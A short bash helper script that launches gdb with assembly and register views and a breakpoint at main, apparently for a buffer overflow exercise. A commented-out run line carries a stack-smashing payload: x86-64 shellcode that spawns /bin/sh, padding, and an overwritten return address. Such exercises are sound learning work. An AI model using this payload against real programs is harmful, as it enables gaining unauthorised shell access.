#!/bin/bash
gdb -tui $1 \
  -ex "set disassembly-flavor intel" \
  -ex "layout asm" \
  -ex "layout regs" \
  -ex "break main" 
  #-ex "run $(python -c 'print "\xeb\x0e\x5f\x48\x31\xc0\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "A" * 236 + "\x7f\xff\xff\xff\xda\x60"[::-1]')"
  #-ex "run $(cat stack)"
	


